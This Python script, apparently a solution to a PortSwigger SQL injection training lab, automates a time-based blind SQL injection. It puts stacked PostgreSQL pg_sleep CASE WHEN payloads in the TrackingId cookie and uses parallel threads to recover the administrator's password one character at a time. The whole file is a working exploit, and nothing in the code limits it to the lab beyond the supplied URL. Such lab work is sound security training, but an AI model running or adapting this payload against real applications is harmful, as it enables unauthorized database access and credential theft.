#!/usr/bin/env python3
"""
Blind SQLi time-based extractor — PortSwigger lab "info-retrieval".
Lab: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

Inyecta en la cookie TrackingId un CASE WHEN ... pg_sleep ... ELSE pg_sleep(0) END
condicionado al carácter de la password. Si la respuesta tarda > THRESHOLD segundos,
el carácter probado coincide con el de la posición consultada.

Lanza en paralelo 20 posiciones x 36 caracteres = 720 candidatos. Con SLEEP=5s y
10 workers, completa en ~15s vs los ~6 min de Burp Community (1 thread).

Uso:
    python3 extract.py --url https://<id>.web-security-academy.net [--session <session-cookie>]
"""

import argparse
import concurrent.futures
import string
import time
import urllib.parse
import requests

CHARSET = string.ascii_lowercase + string.digits   # passwords PortSwigger: lowercase + dígitos
PASSWORD_LEN = 20
SLEEP_SECONDS = 5
THRESHOLD = 3.0
MAX_WORKERS = 10


def build_cookie_value(pos: int, char: str) -> str:
    sql = (
        f"x';SELECT CASE WHEN (username='administrator' AND "
        f"SUBSTRING(password,{pos},1)='{char}') "
        f"THEN pg_sleep({SLEEP_SECONDS}) ELSE pg_sleep(0) END FROM users--"
    )
    # quote_plus encodea ; , = espacios y comillas → cabe en una cookie sin romperla
    return urllib.parse.quote_plus(sql)


def probe(session: requests.Session, url: str, session_cookie: str,
          pos: int, char: str) -> tuple[int, str, float, int]:
    cookie_parts = [f"TrackingId={build_cookie_value(pos, char)}"]
    if session_cookie:
        cookie_parts.append(f"session={session_cookie}")
    headers = {"Cookie": "; ".join(cookie_parts)}

    t0 = time.time()
    try:
        r = session.get(url, headers=headers, timeout=SLEEP_SECONDS + 10, allow_redirects=False)
        status = r.status_code
    except requests.Timeout:
        status = 0
    elapsed = time.time() - t0
    return pos, char, elapsed, status


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--url", required=True, help="Lab base URL (sin path), p.ej. https://0a01.web-security-academy.net")
    parser.add_argument("--session", default="", help="Cookie 'session' (opcional pero recomendado)")
    parser.add_argument("--workers", type=int, default=MAX_WORKERS, help=f"Threads concurrentes (def {MAX_WORKERS})")
    args = parser.parse_args()

    candidates = [(p, c) for p in range(1, PASSWORD_LEN + 1) for c in CHARSET]
    found: dict[int, str] = {}

    print(f"[+] Target:    {args.url}")
    print(f"[+] Probes:    {len(candidates)} ({PASSWORD_LEN} pos × {len(CHARSET)} chars)")
    print(f"[+] Workers:   {args.workers}")
    print(f"[+] Sleep:     {SLEEP_SECONDS}s   Threshold: {THRESHOLD}s")
    print()

    t_start = time.time()
    with requests.Session() as session, \
         concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = {
            pool.submit(probe, session, args.url, args.session, p, c): (p, c)
            for p, c in candidates
        }
        for fut in concurrent.futures.as_completed(futures):
            pos, char, elapsed, status = fut.result()
            if elapsed >= THRESHOLD:
                found[pos] = char
                print(f"  [hit] pos={pos:2d} char={char!r}  ({elapsed:5.2f}s, status={status})  →  {len(found)}/{PASSWORD_LEN}")

    elapsed_total = time.time() - t_start
    print()
    print(f"[+] Done in {elapsed_total:.1f}s")

    if len(found) == PASSWORD_LEN:
        password = "".join(found[i] for i in range(1, PASSWORD_LEN + 1))
        print(f"[+] Password: {password}")
    else:
        missing = sorted(set(range(1, PASSWORD_LEN + 1)) - set(found))
        partial = "".join(found.get(i, "?") for i in range(1, PASSWORD_LEN + 1))
        print(f"[!] Missing positions: {missing}")
        print(f"[!] Partial: {partial}")
        print(f"[!] Amplía CHARSET (mayúsculas/símbolos) y relanza.")


if __name__ == "__main__":
    main()
